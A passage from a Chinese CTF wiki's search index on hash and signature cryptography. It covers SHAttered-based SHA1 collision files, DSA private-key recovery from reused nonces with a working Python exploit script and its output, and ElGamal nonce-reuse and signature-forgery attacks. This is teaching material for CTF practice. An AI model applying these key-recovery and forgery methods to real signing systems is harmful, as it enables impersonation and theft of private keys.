\u51fd\u6570\u7684\u521d\u59cb\u5316IV\u3002</p> <pre><code>0x67452301\n0xEFCDAB89\n0x98BADCFE\n0x10325476\n0xC3D2E1F0\n</code></pre> <p>\u524d\u9762\u56db\u4e2a\u4e0e MD5 \u7c7b\u4f3c\uff0c\u540e\u9762\u7684\u662f\u65b0\u52a0\u7684\u3002</p>"},{"location":"crypto/hash/sha1/#_2","title":"\u7834\u89e3","text":"<p>\u5c31\u76ee\u524d\u800c\u8a00\uff0cSHA1 \u5df2\u7ecf\u4e0d\u518d\u5b89\u5168\u4e86\uff0c\u56e0\u4e3a\u4e4b\u524d\u8c37\u6b4c\u516c\u5e03\u4e86\u6c42\u5f97\u4e24\u4e2a sha1 \u503c\u4e00\u6837\u7684 pdf\uff0c\u5177\u4f53\u8bf7\u53c2\u8003 shattered \u3002</p> <p>\u8fd9\u91cc\u8fd8\u6709\u4e00\u4e2a\u6bd4\u8f83\u6709\u610f\u601d\u7684\u7f51\u7ad9\uff1ahttps://alf.nu/SHA1\u3002</p>"},{"location":"crypto/hash/sha1/#2017-seccon-sha1-is-dead","title":"2017 SECCON SHA1 is dead","text":"<p>\u9898\u76ee\u63cf\u8ff0\u5982\u4e0b</p> <ol> <li>file1 != file2</li> <li>SHA1(file1) == SHA1(file2)</li> <li>SHA256(file1) &lt;&gt; SHA256(file2)</li> <li>2017KiB &lt; sizeof(file1) &lt; 2018KiB</li> <li>2017KiB &lt; sizeof(file2) &lt; 2018KiB</li> </ol> <p>\u5176\u4e2d 1KiB = 1024 bytes</p> <p>\u5373\u6211\u4eec\u9700\u8981\u627e\u5230\u4e24\u4e2a\u6587\u4ef6\u6ee1\u8db3\u4e0a\u8ff0\u7684\u7ea6\u675f\u3002</p> <p>\u8fd9\u91cc\u7acb\u9a6c\u5c31\u60f3\u5230\u8c37\u6b4c\u4e4b\u524d\u516c\u5e03\u7684\u6587\u6863\uff0c\u800c\u4e14\uff0c\u975e\u5e38\u91cd\u8981\u7684\u662f\uff0c\u53ea\u8981\u4f7f\u7528\u7ed9\u5b9a\u7684\u524d 320 \u5b57\u8282\uff0c\u540e\u9762\u4efb\u610f\u6dfb\u52a0\u4e00\u6837\u7684\u5b57\u8282\u83b7\u53d6\u7684\u54c8\u5e0c\u4ecd\u7136\u4e00\u6837\uff0c\u8fd9\u91cc\u6211\u4eec\u6d4b\u8bd5\u5982\u4e0b</p> <pre><code>\u279c  2017_seccon_sha1_is_dead git:(master) dd bs=1 count=320 &lt;shattered-1.pdf| sha1sum\n\u8bb0\u5f55\u4e86320+0 \u7684\u8bfb\u5165\n\u8bb0\u5f55\u4e86320+0 \u7684\u5199\u51fa\n320 bytes copied, 0.00796817 s, 40.2 kB/s\nf92d74e3874587aaf443d1db961d4e26dde13e9c  -\n\u279c  2017_seccon_sha1_is_dead git:(master) dd bs=1 count=320 &lt;shattered-2.pdf| sha1sum\n\u8bb0\u5f55\u4e86320+0 \u7684\u8bfb\u5165\n\u8bb0\u5f55\u4e86320+0 \u7684\u5199\u51fa\n320 bytes copied, 0.00397215 s, 80.6 kB/s\nf92d74e3874587aaf443d1db961d4e26dde13e9c  -\n</code></pre> <p>\u8fdb\u800c\u6211\u4eec\u76f4\u63a5\u5199\u7a0b\u5e8f\u5373\u53ef\uff0c\u5982\u4e0b</p> <pre><code>from hashlib import sha1\nfrom hashlib import sha256\n\npdf1 = open('./shattered-1.pdf').read(320)\npdf2 = open('./shattered-2.pdf').read(320)\npdf1 = pdf1.ljust(2017 * 1024 + 1 - 320, \"\\00\")  #padding pdf to 2017Kib + 1\npdf2 = pdf2.ljust(2017 * 1024 + 1 - 320, \"\\00\")\nopen(\"upload1\", \"w\").write(pdf1)\nopen(\"upload2\", \"w\").write(pdf2)\n\nprint sha1(pdf1).hexdigest()\nprint sha1(pdf2).hexdigest()\nprint sha256(pdf1).hexdigest()\nprint sha256(pdf2).hexdigest()\n</code></pre>"},{"location":"crypto/hash/sha1/#_3","title":"\u53c2\u8003\u6587\u732e","text":"<ul> <li>https://www.slideshare.net/herumi/googlesha1</li> </ul>"},{"location":"crypto/signature/dsa/","title":"DSA","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u4e0a\u9762\u6240\u63cf\u8ff0\u7684ElGamal\u7b7e\u540d\u7b97\u6cd5\u5728\u5b9e\u9645\u4e2d\u5e76\u4e0d\u5e38\u7528\uff0c\u66f4\u5e38\u7528\u7684\u662f\u5176\u53d8\u4f53DSA\u3002</p>"},{"location":"crypto/signature/dsa/#_1","title":"\u57fa\u672c\u539f\u7406","text":""},{"location":"crypto/signature/dsa/#_2","title":"\u5bc6\u94a5\u751f\u6210","text":"<ol> <li>\u9009\u62e9\u4e00\u4e2a\u5408\u9002\u7684\u54c8\u5e0c\u51fd\u6570\uff0c\u76ee\u524d\u4e00\u822c\u9009\u62e9SHA1\uff0c\u5f53\u524d\u4e5f\u53ef\u4ee5\u9009\u62e9\u5f3a\u5ea6\u66f4\u9ad8\u7684\u54c8\u5e0c\u51fd\u6570H\u3002</li> <li>\u9009\u62e9\u5bc6\u94a5\u7684\u957f\u5ea6L\u548cN\uff0c\u8fd9\u4e24\u4e2a\u503c\u51b3\u5b9a\u4e86\u7b7e\u540d\u7684\u5b89\u5168\u7a0b\u5ea6\u3002\u5728\u6700\u521d\u7684DSS\uff08Digital Signature Standard \uff09\u4e2d\u5efa\u8baeL\u5fc5\u987b\u4e3a64\u7684\u500d\u6570\uff0c\u5e76\u4e14512 \\leq L \\leq 1024 \uff0c\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u66f4\u5927\u3002N\u5fc5\u987b\u5927\u5c0f\u5fc5\u987b\u4e0d\u5927\u4e8e\u54c8\u5e0c\u51fd\u6570H\u8f93\u51fa\u7684\u957f\u5ea6\u3002FIPS 186-3\u7ed9\u51fa\u4e86\u4e00\u4e9b\u5efa\u8bae\u7684L\u548cN\u7684\u53d6\u503c\u4f8b\u5b50\uff1a(1024, 160)\uff0c (2048, 224)\uff0c (2048, 256)\uff0c\u4ee5\u53ca (3,072, 256)\u3002</li> <li>\u9009\u62e9N\u6bd4\u7279\u7684\u7d20\u6570q\u3002</li> <li>\u9009\u62e9L\u6bd4\u7279\u7684\u7d20\u6570p\uff0c\u4f7f\u5f97p-1\u662fq\u7684\u500d\u6570\u3002</li> <li>\u9009\u62e9\u6ee1\u8db3g^k \\equiv 1 \\bmod p \u7684\u6700\u5c0f\u6b63\u6574\u6570k\u4e3aq\u7684g\uff0c\u5373\u5728\u6a21p\u7684\u80cc\u666f\u4e0b\uff0cord(g)=q\u7684g\u3002\u5373g\u5728\u6a21p\u7684\u610f\u4e49\u4e0b\uff0c\u5176\u6307\u6570\u6b21\u5e42\u53ef\u4ee5\u751f\u6210\u5177\u6709q\u4e2a\u5143\u7d20\u7684\u5b50\u7fa4\u3002\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8ba1\u7b97g=h^{\\frac{p-1}{q}} \\bmod p \u6765\u5f97\u5230g\uff0c\u5176\u4e2d1&lt; h &lt; p-1 \u3002</li> <li>\u9009\u62e9\u79c1\u94a5x\uff0c0&lt;x&lt;q \uff0c\u8ba1\u7b97y \\equiv g^x \\bmod p \u3002</li> </ol> <p>\u516c\u94a5\u4e3a(p,q,g,y)\uff0c\u79c1\u94a5\u4e3a(x)\u3002</p>"},{"location":"crypto/signature/dsa/#_3","title":"\u7b7e\u540d","text":"<p>\u7b7e\u540d\u6b65\u9aa4\u5982\u4e0b</p> <ol> <li>\u9009\u62e9\u968f\u673a\u6574\u6570\u6570k\u4f5c\u4e3a\u4e34\u65f6\u5bc6\u94a5\uff0c0&lt;k&lt;q \u3002</li> <li>\u8ba1\u7b97r\\equiv (g^k \\bmod p) \\bmod q</li> <li>\u8ba1\u7b97s\\equiv (H(m)+xr)k^{-1} \\bmod q</li> </ol> <p>\u7b7e\u540d\u7ed3\u679c\u4e3a(r,s)\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u4e0eElgamal\u5f88\u91cd\u8981\u7684\u4e0d\u540c\u662f\u8fd9\u91cc\u4f7f\u7528\u4e86\u54c8\u5e0c\u51fd\u6570\u5bf9\u6d88\u606f\u8fdb\u884c\u4e86\u54c8\u5e0c\u5904\u7406\u3002</p>"},{"location":"crypto/signature/dsa/#_4","title":"\u9a8c\u8bc1","text":"<p>\u9a8c\u8bc1\u8fc7\u7a0b\u5982\u4e0b</p> <ol> <li>\u8ba1\u7b97\u8f85\u52a9\u503c\uff0cw=s^{-1} \\bmod q</li> <li>\u8ba1\u7b97\u8f85\u52a9\u503c\uff0cu_1=H(m)w \\bmod q</li> <li>\u8ba1\u7b97\u8f85\u52a9\u503c\uff0cu_2=rw \\bmod q</li> <li>\u8ba1\u7b97v=(g^{u_1}y^{u_2} \\bmod p) \\bmod q</li> <li>\u5982\u679cv\u4e0er\u76f8\u7b49\uff0c\u5219\u6821\u9a8c\u6210\u529f\u3002</li> </ol>"},{"location":"crypto/signature/dsa/#_5","title":"\u6b63\u786e\u6027\u63a8\u5bfc","text":"<p>\u9996\u5148\uff0cg \u6ee1\u8db3 g^k \\equiv 1 \\bmod p \u7684\u6700\u5c0f\u6b63\u6574\u6570k\u4e3aq\u3002\u6240\u4ee5 g^q \\equiv 1 \\bmod p  \u3002\u6240\u4ee5 g^x \\equiv g^{x \\bmod q} \\bmod p \u3002\u8fdb\u800c</p> <p>v=(g^{u_1}y^{u_2} \\bmod p) \\bmod q=g^{u_1}g^{xu_2} \\equiv g^{H(m)w}g^{xrw} \\equiv g^{H(m)w+xrw}</p> <p>\u53c8s\\equiv (H(m)+xr)k^{-1} \\bmod q \u4e14w=s^{-1} \\bmod q \u6240\u4ee5</p> <p>k \\equiv s^{-1}(H(m)+xr) \\equiv H(m)w+xrw \\bmod q</p> <p>\u6240\u4ee5v \\equiv g^k \u3002\u6b63\u786e\u6027\u5f97\u8bc1\u3002</p>"},{"location":"crypto/signature/dsa/#_6","title":"\u5b89\u5168\u6027","text":""},{"location":"crypto/signature/dsa/#k","title":"\u5df2\u77e5k","text":""},{"location":"crypto/signature/dsa/#_7","title":"\u539f\u7406","text":"<p>\u5982\u679c\u77e5\u9053\u4e86\u968f\u673a\u5bc6\u94a5k\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6839\u636es\\equiv (H(m)+xr)k^{-1} \\bmod q \u8ba1\u7b97\u79c1\u94a5d\uff0c\u51e0\u4e4e\u653b\u7834\u4e86DSA\u3002</p> <p>\u8fd9\u91cc\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6d88\u606f\u7684hash\u503c\u90fd\u4f1a\u7ed9\u51fa\u3002</p> <p>x \\equiv r^{-1}(ks-H(m)) \\bmod q</p>"},{"location":"crypto/signature/dsa/#k_1","title":"k\u5171\u4eab","text":""},{"location":"crypto/signature/dsa/#_8","title":"\u539f\u7406","text":"<p>\u5982\u679c\u5728\u4e24\u6b21\u7b7e\u540d\u7684\u8fc7\u7a0b\u4e2d\u5171\u4eab\u4e86k\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u8fdb\u884c\u653b\u51fb\u3002</p> <p>\u5047\u8bbe\u7b7e\u540d\u7684\u6d88\u606f\u4e3am1,m2\uff0c\u663e\u7136\uff0c\u4e24\u8005\u7684r\u7684\u503c\u4e00\u6837\uff0c\u6b64\u5916</p> <p>s_1\\equiv (H(m_1)+xr)k^{-1} \\bmod q</p> <p>s_2\\equiv (H(m_2)+xr)k^{-1} \\bmod q</p> <p>\u8fd9\u91cc\u6211\u4eec\u9664\u4e86x\u548ck\u4e0d\u77e5\u9053\u5269\u4e0b\u7684\u5747\u77e5\u9053\uff0c\u90a3\u4e48</p> <p>s_1k \\equiv H(m_1)+xr</p> <p>s_2k \\equiv H(m_2)+xr</p> <p>\u4e24\u5f0f\u76f8\u51cf</p> <p>k(s_1-s_2) \\equiv H(m_1)-H(m_2) \\bmod q</p> <p>\u6b64\u65f6 \u5373\u53ef\u89e3\u51fak\uff0c\u8fdb\u4e00\u6b65\u6211\u4eec\u53ef\u4ee5\u89e3\u51fax\u3002</p>"},{"location":"crypto/signature/dsa/#_9","title":"\u4f8b\u5b50","text":"<p>\u8fd9\u91cc\u6211\u4eec\u4ee5\u6e56\u6e58\u676f\u7684DSA\u4e3a\u4f8b\uff0c\u4f46\u662f\u4e0d\u80fd\u76f4\u63a5\u53bb\u505a\uff0c\uff0c\uff0c\u56e0\u4e3a\u53d1\u73b0\u5728\u9a8c\u8bc1message4\u7684\u65f6\u5019\u7b7e\u540d\u4e0d\u901a\u8fc7\u3002\u6e90\u9898\u76ee\u6211\u6ca1\u6709\u4e86\uff0c\u3002\uff0c\uff0c\u8fd9\u91cc\u6211\u4ee5Jarvis OJ\u4e2d\u7ecf\u8fc7\u4fee\u6539\u7684\u9898\u76eeDSA\u4e3a\u4f8b</p> <pre><code>\u279c  2016\u6e56\u6e58\u676fDSA git:(master) \u2717 openssl sha1 -verify dsa_public.pem -signature packet1/sign1.bin  packet1/message1  \nVerified OK\n\u279c  2016\u6e56\u6e58\u676fDSA git:(master) \u2717 openssl sha1 -verify dsa_public.pem -signature packet2/sign2.bin  packet2/message1 \npacket2/message1: No such file or directory\n\u279c  2016\u6e56\u6e58\u676fDSA git:(master) \u2717 openssl sha1 -verify dsa_public.pem -signature packet2/sign2.bin  packet2/message2 \nVerified OK\n\u279c  2016\u6e56\u6e58\u676fDSA git:(master) \u2717 openssl sha1 -verify dsa_public.pem -signature packet3/sign3.bin  packet3/message3 \nVerified OK\n\u279c  2016\u6e56\u6e58\u676fDSA git:(master) \u2717 openssl sha1 -verify dsa_public.pem -signature packet4/sign4.bin  packet4/message4\nVerified OK\n</code></pre> <p>\u53ef\u4ee5\u770b\u51fa\u56db\u5219\u6d88\u606f\u5168\u90e8\u6821\u9a8c\u901a\u8fc7\u3002\u8fd9\u91cc\u4e4b\u6240\u4ee5\u4f1a\u8054\u60f3\u5230\u5171\u4eabk\u662f\u56e0\u4e3a\u9898\u76ee\u4e2d\u63d0\u793a\u4e86PS3\u7684\u7834\u89e3\u66fe\u7528\u5230\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u4ece\u7f51\u4e0a\u641c\u7d22\u53ef\u77e5\u8be5\u653b\u51fb\u3002</p> <p>\u4e0b\u9762\uff0c\u6211\u4eec\u770b\u4e00\u4e0b\u7b7e\u540d\u540e\u7684\u503c\uff0c\u8fd9\u91cc\u4f7f\u7528\u7684\u547d\u4ee4\u5982\u4e0b</p> <pre><code>\u279c  2016\u6e56\u6e58\u676fDSA git:(master) \u2717 openssl asn1parse -inform der -in packet4/sign4.bin  0:d=0  hl=2 l=  44 cons: SEQUENCE          2:d=1  hl=2 l=  20 prim: INTEGER           :5090DA81FEDE048D706D80E0AC47701E5A9EF1CC\n   24:d=1  hl=2 l=  20 prim: INTEGER           :5E10DED084203CCBCEC3356A2CA02FF318FD4123\n\u279c  2016\u6e56\u6e58\u676fDSA git:(master) \u2717 openssl asn1parse -inform der -in packet3/sign3.bin  0:d=0  hl=2 l=  44 cons: SEQUENCE          2:d=1  hl=2 l=  20 prim: INTEGER           :5090DA81FEDE048D706D80E0AC47701E5A9EF1CC\n   24:d=1  hl=2 l=  20 prim: INTEGER           :30EB88E6A4BFB1B16728A974210AE4E41B42677D\n\u279c  2016\u6e56\u6e58\u676fDSA git:(master) \u2717 openssl asn1parse -inform der -in packet2/sign2.bin  0:d=0  hl=2 l=  44 cons: SEQUENCE          2:d=1  hl=2 l=  20 prim: INTEGER           :60B9F2A5BA689B802942D667ED5D1EED066C5A7F\n   24:d=1  hl=2 l=  20 prim: INTEGER           :3DC8921BA26B514F4D991A85482750E0225A15B5\n\u279c  2016\u6e56\u6e58\u676fDSA git:(master) \u2717 openssl asn1parse -inform der -in packet1/sign1.bin  0:d=0  hl=2 l=  45 cons: SEQUENCE          2:d=1  hl=2 l=  21 prim: INTEGER           :8158B477C5AA033D650596E93653C730D26BA409\n   25:d=1  hl=2 l=  20 prim: INTEGER           :165B9DD1C93230C31111E5A4E6EB5181F990F702\n</code></pre> <p>\u5176\u4e2d\uff0c\u83b7\u53d6\u7684\u7b2c\u4e00\u4e2a\u503c\u662fr\uff0c\u7b2c\u4e8c\u4e2a\u503c\u662fs\u3002\u53ef\u4ee5\u770b\u5230\u7b2c4\u4e2apacket\u548c\u7b2c3\u4e2apacket\u5171\u4eab\u4e86k\uff0c\u56e0\u4e3a\u4ed6\u4eec\u7684r\u4e00\u81f4\u3002</p> <p>\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528openssl\u770b\u4e0b\u516c\u94a5</p> <pre><code>\u279c  2016\u6e56\u6e58\u676fDSA git:(master) \u2717 openssl dsa -in dsa_public.pem -text -noout  -pubin read DSA key\npub: 45:bb:18:f6:0e:b0:51:f9:d4:82:18:df:8c:d9:56:\n    33:0a:4f:f3:0a:f5:34:4f:6c:95:40:06:1d:53:83:\n    29:2d:95:c4:df:c8:ac:26:ca:45:2e:17:0d:c7:9b:\n    e1:5c:c6:15:9e:03:7b:cc:f5:64:ef:36:1c:18:c9:\n    9e:8a:eb:0b:c1:ac:f9:c0:c3:5d:62:0d:60:bb:73:\n    11:f1:cf:08:cf:bc:34:cc:aa:79:ef:1d:ad:8a:7a:\n    6f:ac:ce:86:65:90:06:d4:fa:f0:57:71:68:57:ec:\n    7c:a6:04:ad:e2:c3:d7:31:d6:d0:2f:93:31:98:d3:\n    90:c3:ef:c3:f3:ff:04:6f\nP:   00:c0:59:6c:3b:5e:93:3d:33:78:be:36:26:be:31:\n    5e:e7:0c:a6:b5:b1:1a:51:9b:55:23:d4:0e:5b:a7:\n    45:66:e2:2c:c8:8b:fe:c5:6a:ad:66:91:8b:9b:30:\n    ad:28:13:88:f0:bb:c6:b8:02:6b:7c:80:26:e9:11:\n    84:be:e0:c8:ad:10:cc:f2:96:be:cf:e5:05:05:38:\n    3c:b4:a9:54:b3:7c:b5:88:67:2f:7c:09:57:b6:fd:\n    f2:fa:05:38:fd:ad:83:93:4a:45:e4:f9:9d:38:de:\n    57:c0:8a:24:d0:0d:1c:c5:d5:fb:db:73:29:1c:d1:\n    0c:e7:57:68:90:b6:ba:08:9b\nQ:   00:86:8f:78:b8:c8:50:0b:eb:f6:7a:58:e3:3c:1f:\n    53:9d:35:70:d1:bd\nG:   4c:d5:e6:b6:6a:6e:b7:e9:27:94:e3:61:1f:41:53:\n    cb:11:af:5a:08:d9:d4:f8:a3:f2:50:03:72:91:ba:\n    5f:ff:3c:29:a8:c3:7b:c4:ee:5f:98:ec:17:f4:18:\n    bc:71:61:01:6c:94:c8:49:02:e4:00:3a:79:87:f0:\n    d8:cf:6a:61:c1:3a:fd:56:73:ca:a5:fb:41:15:08:\n    cd:b3:50:1b:df:f7:3e:74:79:25:f7:65:86:f4:07:\n    9f:ea:12:09:8b:34:50:84:4a:2a:9e:5d:0a:99:bd:\n    86:5e:05:70:d5:19:7d:f4:a1:c9:b8:01:8f:b9:9c:\n    dc:e9:15:7b:98:50:01:79\n</code></pre> <p>\u4e0b\u9762\uff0c\u6211\u4eec\u76f4\u63a5\u5229\u7528\u4e0a\u9762\u7684\u539f\u7406\u7f16\u5199\u7a0b\u5e8f\u5373\u53ef\uff0c\u7a0b\u5e8f\u5982\u4e0b</p> <pre><code>#coding=utf8\nfrom Crypto.PublicKey import DSA\nfrom hashlib import sha1\nimport gmpy2\nwith open('./dsa_public.pem') as f:\n    key = DSA.importKey(f)\n    y = key.y\n    g = key.g\n    p = key.p\n    q = key.q\nf3 = open(r\"packet3/message3\", 'r')\nf4 = open(r\"packet4/message4\", 'r')\ndata3 = f3.read()\ndata4 = f4.read()\nsha = sha1()\nsha.update(data3)\nm3 = int(sha.hexdigest(), 16)\nsha = sha1()\nsha.update(data4)\nm4 = int(sha.hexdigest(), 16)\nprint m3, m4\ns3 = 0x30EB88E6A4BFB1B16728A974210AE4E41B42677D\ns4 = 0x5E10DED084203CCBCEC3356A2CA02FF318FD4123\nr = 0x5090DA81FEDE048D706D80E0AC47701E5A9EF1CC\nds = s4 - s3\ndm = m4 - m3\nk = gmpy2.mul(dm, gmpy2.invert(ds, q))\nk = gmpy2.f_mod(k, q)\ntmp = gmpy2.mul(k, s3) - m3\nx = tmp * gmpy2.invert(r, q)\nx = gmpy2.f_mod(x, q)\nprint int(x)\n</code></pre> <p>\u6211\u53d1\u73b0pip\u5b89\u88c5\u7684pycrypto\u7adf\u7136\u6ca1\u6709DSA\u7684importKey\u51fd\u6570\u3002\u3002\u3002\u53ea\u597d\u4ecegithub\u4e0a\u4e0b\u8f7d\u5b89\u88c5\u4e86pycrypto\u3002\u3002\u3002</p> <p>\u7ed3\u679c\u5982\u4e0b</p> <pre><code>\u279c  2016\u6e56\u6e58\u676fDSA git:(master) \u2717 python exp.py\n1104884177962524221174509726811256177146235961550 943735132044536149000710760545778628181961840230\n520793588153805320783422521615148687785086070744\n</code></pre>"},{"location":"crypto/signature/elgamal/","title":"ElGamal","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>RSA\u7684\u6570\u5b57\u7b7e\u540d\u65b9\u6848\u51e0\u4e4e\u4e0e\u5176\u52a0\u5bc6\u65b9\u6848\u5b8c\u5168\u4e00\u81f4\uff0c\u53ea\u662f\u5229\u7528\u79c1\u94a5\u8fdb\u884c\u4e86\u7b7e\u540d\u3002\u4f46\u662f\uff0c\u5bf9\u4e8eElGamal\u6765\u8bf4\uff0c\u5176\u7b7e\u540d\u65b9\u6848\u4e0e\u76f8\u5e94\u7684\u52a0\u5bc6\u65b9\u6848\u5177\u6709\u5f88\u5927\u533a\u522b\u3002</p>"},{"location":"crypto/signature/elgamal/#_1","title":"\u57fa\u672c\u539f\u7406","text":""},{"location":"crypto/signature/elgamal/#_2","title":"\u5bc6\u94a5\u751f\u6210","text":"<p>\u57fa\u672c\u6b65\u9aa4\u5982\u4e0b</p> <ol> <li>\u9009\u53d6\u4e00\u4e2a\u8db3\u591f\u5927\u7684\u7d20\u6570p\uff08\u5341\u8fdb\u5236\u4f4d\u6570\u4e0d\u4f4e\u4e8e160\uff09\uff0c\u4ee5\u4fbf\u4e8e\u5728Z_p \u4e0a\u6c42\u89e3\u79bb\u6563\u5bf9\u6570\u95ee\u9898\u662f\u56f0\u96be\u7684\u3002</li> <li>\u9009\u53d6Z_p^* \u7684\u751f\u6210\u5143g\u3002</li> <li>\u968f\u673a\u9009\u53d6\u6574\u6570d,0\\leq d \\leq p-2 \uff0c\u5e76\u8ba1\u7b97g^d \\equiv y \\bmod p \u3002</li> </ol> <p>\u5176\u4e2d\u79c1\u94a5\u4e3a{d}\uff0c\u516c\u94a5\u4e3a{p,g,y} \u3002</p>"},{"location":"crypto/signature/elgamal/#_3","title":"\u7b7e\u540d","text":"<p>A\u9009\u53d6\u968f\u673a\u6570k \\in Z_{p-1} \uff0c\u5e76\u4e14gcd(k,p-1)=1\uff0c\u5bf9\u6d88\u606f\u8fdb\u884c\u7b7e\u540d</p>  sig_d(m,k)=(r,s)  <p>\u5176\u4e2dr \\equiv g^k \\bmod p \uff0cs \\equiv (m-dr)k^{-1} \\bmod p-1 \u3002</p>"},{"location":"crypto/signature/elgamal/#_4","title":"\u9a8c\u8bc1","text":"<p>\u5982\u679c g^m \\equiv y^rr^s \\bmod p \uff0c\u90a3\u4e48\u9a8c\u8bc1\u6210\u529f\uff0c\u5426\u5219\u9a8c\u8bc1\u5931\u8d25\u3002\u8fd9\u91cc\u9a8c\u8bc1\u6210\u529f\u7684\u539f\u7406\u5982\u4e0b\uff0c\u9996\u5148\u6211\u4eec\u6709</p>  y^rr^s \\equiv g^{dr}g^{ks} \\equiv g^{dr+ks}  <p>\u53c8\u56e0\u4e3a</p>  s \\equiv (m-dr)k^{-1} \\bmod p-1  <p>\u6240\u4ee5</p>  ks \\equiv m-dr \\bmod p-1  <p>\u8fdb\u800c</p>  ks+dr=a*(p-1)+m  <p>\u6240\u4ee5</p>  g^{ks+dr}=g^{a*(p-1)+m}=(g^{p-1})^a*g^m  <p>\u6240\u4ee5\u6839\u636e\u8d39\u9a6c\u5b9a\u7406\uff0c\u53ef\u5f97</p>  g^{ks+dr} \\equiv g^m \\bmod p"},{"location":"crypto/signature/elgamal/#_5","title":"\u5e38\u89c1\u653b\u51fb","text":""},{"location":"crypto/signature/elgamal/#_6","title":"\u5b8c\u5168\u7834\u8bd1\u653b\u51fb","text":""},{"location":"crypto/signature/elgamal/#_7","title":"\u653b\u51fb\u6761\u4ef6","text":"<ul> <li>p\u592a\u5c0f\u6216\u65e0\u5927\u7d20\u56e0\u5b50</li> </ul> <p>\u5982\u679cp\u592a\u5c0f\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u7528\u5927\u90e8\u5c0f\u6b65\u7b97\u6cd5\u5206\u89e3, \u6216\u8005\u5982\u679c\u5176\u65e0\u5927\u7684\u7d20\u56e0\u5b50, \u6211\u4eec\u53ef\u4ee5\u91c7\u7528Pohling\\: Hellman\u7b97\u6cd5\u8ba1\u7b97\u79bb\u6563\u5bf9\u6570\u5373\u53ef\u8fdb\u800c\u6c42\u51fa\u79c1\u94a5\u3002</p> <ul> <li>\u968f\u673a\u6570k\u590d\u7528</li> </ul> <p>\u5982\u679c\u7b7e\u540d\u8005\u590d\u7528\u4e86\u968f\u673a\u6570k\uff0c\u90a3\u4e48\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u8f7b\u800c\u6613\u4e3e\u5730\u8ba1\u7b97\u51fa\u79c1\u94a5\u3002\u5177\u4f53\u7684\u539f\u7406\u5982\u4e0b\uff1a</p> <p>\u5047\u8bbe\u76ee\u524d\u6709\u4e24\u4e2a\u7b7e\u540d\u90fd\u662f\u4f7f\u7528\u540c\u4e00\u4e2a\u968f\u673a\u6570\u8fdb\u884c\u7b7e\u540d\u7684\u3002\u90a3\u4e48\u6211\u4eec\u6709</p>  r \\equiv g^k \\bmod p \\\\\\\\ s _1\\equiv (m_1-dr)k^{-1} \\bmod p-1\\\\\\\\ r \\equiv g^k \\bmod p \\\\\\\\ s_2 \\equiv (m_2-dr)k^{-1} \\bmod p-1  <p>\u8fdb\u800c\u6709</p>  s_1k \\equiv m_1-dr \\bmod p-1 \\\\\\\\ s_2k \\equiv m_2-dr \\bmod p-1  <p>\u4e24\u5f0f\u76f8\u51cf</p>  k(s_1-s_2) \\equiv m_1-m_2 \\bmod p-1  <p>\u8fd9\u91cc\uff0cs_1,s_2,m_1,m_2,p-1 \u5747\u5df2\u77e5\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f88\u5bb9\u6613\u7b97\u51fak\u3002\u5f53\u7136\uff0c\u5982\u679cgcd(s_1-s_2,p-1)!=1 \u7684\u8bdd\uff0c\u53ef\u80fd\u4f1a\u5b58\u5728\u591a\u4e2a\u89e3\uff0c\u8fd9\u65f6\u6211\u4eec\u53ea\u9700\u8981\u591a\u8bd5\u4e00\u8bd5\u3002\u8fdb\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u6839\u636es\u7684\u8ba1\u7b97\u65b9\u6cd5\u5f97\u5230\u79c1\u94a5d\uff0c\u5982\u4e0b</p>  d \\equiv \\frac{m-ks}{r}"},{"location":"crypto/signature/elgamal/#_8","title":"\u9898\u76ee","text":"<p>2016 LCTF Crypto 450</p>"},{"location":"crypto/signature/elgamal/#_9","title":"\u901a\u7528\u4f2a\u9020\u7b7e\u540d","text":""},{"location":"crypto/signature/elgamal/#_10","title":"\u653b\u51fb\u6761\u4ef6","text":"<p>\u5982\u679c\u6d88\u606fm\u6ca1\u6709\u53d6\u54c8\u5e0c\uff0c\u6216\u8005\u6d88\u606fm\u6ca1\u6709\u6307\u5b9a\u6d88\u606f\u683c\u5f0f\u7684\u60c5\u51b5\u4e0b\u653b\u51fb\u6210\u7acb\u3002</p>"},{"location":"crypto/signature/elgamal/#_11","title":"\u539f\u7406","text":"<p>\u5728\u653b\u51fb\u8005\u77e5\u9053\u4e86\u67d0\u4e2a\u4ebaAlice\u7684\u516c\u94a5\u4e4b\u540e\uff0c\u4ed6\u53ef\u4ee5\u4f2a\u9020Alice\u7684\u7b7e\u540d\u4fe1\u606f\u3002\u5177\u4f53\u539f\u7406\u5982\u4e0b:</p> <p>\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\uff0cAlice\u7684\u516c\u94a5\u4e3a{p,g,y}\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u6309\u7167\u5982\u4e0b\u65b9\u5f0f\u4f2a\u9020</p> <ol> <li> <p>\u9009\u62e9\u6574\u6570 i\uff0cj\uff0c\u5176\u4e2dgcd(j,p-1)=1</p> </li> <li> <p>\u8ba1\u7b97\u7b7e\u540d\uff0cr \\equiv g^iy^j \\bmod p \uff0cs\\equiv -rj^{-1} \\bmod p-1</p> </li> <li> <p>\u8ba1\u7b97\u6d88\u606f\uff0cm\\equiv si \\bmod p-1</p> </li> </ol> <p>\u90a3\u4e48\u6b64\u65f6\u751f\u6210\u7684\u7b7e\u540d\u4e0e\u6d88\u606f\u5c31\u662f\u53ef\u4ee5\u88ab\u6b63\u5e38\u901a\u8fc7\u9a8c\u8bc1\uff0c\u5177\u4f53\u63a8\u5bfc\u5982\u4e0b:</p> <p>y^rr^s \\equiv g^{dr}g^{is}y^{js} \\equiv g^{dr}g^{djs}g^{is} \\equiv g^{dr+s(i+dj)} \\equiv g^{dr} 